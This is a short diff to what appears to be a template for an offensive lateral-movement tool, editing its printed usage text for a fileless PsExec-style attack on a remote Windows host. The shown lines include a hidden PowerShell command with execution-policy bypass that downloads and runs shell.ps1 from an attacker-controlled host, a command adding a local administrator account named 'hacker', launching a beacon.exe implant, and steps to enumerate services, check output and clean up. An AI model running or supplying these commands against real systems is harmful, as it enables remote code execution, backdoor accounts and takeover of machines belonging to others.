@@ -76,10 +76,10 @@ output:
 
     Enumerate Target Services:
     Get-Service -ComputerName {{ target_host }}
-    sc \\{{ target_host }} query
+    $ sc \\{{ target_host }} query
 
     Execute Fileless PSExec:
-    {{ output_file }} {{ target_host }} {{ service_name }} "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')"
+    {{ output_file }} {{ target_host }} {{ service_name }} "powershell -ep bypass -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://{{ lhost }}/shell.ps1')"
 
     Example - Add Local Admin:
     {{ output_file }} {{ target_host }} {{ service_name }} "net user hacker P@ssw0rd /add && net localgroup administrators hacker /add"
@@ -88,7 +88,7 @@ output:
     {{ output_file }} {{ target_host }} {{ service_name }} "C:\\Windows\\Temp\\beacon.exe"
 
     Verify Execution:
-    type \\{{ target_host }}\C$\Temp\out.txt
+    $ type \\{{ target_host }}\C$\Temp\out.txt
     Get-Process -ComputerName {{ target_host }}
 
     Notes:
@@ -113,4 +113,4 @@ output:
 
     Cleanup:
     Service configuration is automatically restored.
-    Remove-Item {{ output_file }} -Force
+    $ Remove-Item {{ output_file }} -Force
